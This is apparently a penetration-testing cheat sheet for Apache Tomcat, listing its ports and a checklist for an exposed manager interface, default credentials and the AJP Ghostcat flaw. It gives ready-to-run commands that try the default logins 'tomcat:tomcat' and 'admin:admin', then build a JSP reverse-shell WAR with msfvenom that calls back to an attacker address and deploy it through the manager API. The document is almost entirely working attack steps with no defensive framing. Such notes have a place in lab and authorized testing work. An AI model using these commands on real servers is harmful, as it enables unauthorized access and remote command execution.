# Tomcat

**Ports:** 8080, 8443, 8009

**Quick Checklist**
- [ ] Manager open? (`/manager/html`)
- [ ] Default creds (`tomcat:tomcat`, `admin:admin`)?
- [ ] Can deploy WAR?
- [ ] AJP (8009) open → Ghostcat?

```bash
curl -u tomcat:tomcat http://IP:8080/manager/text/list
curl -u admin:admin http://IP:8080/manager/text/list
```

**Deploy WAR**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f war > shell.war
curl -u admin:password --upload-file shell.war \
  "http://IP:8080/manager/text/deploy?path=/shell&update=true"
```
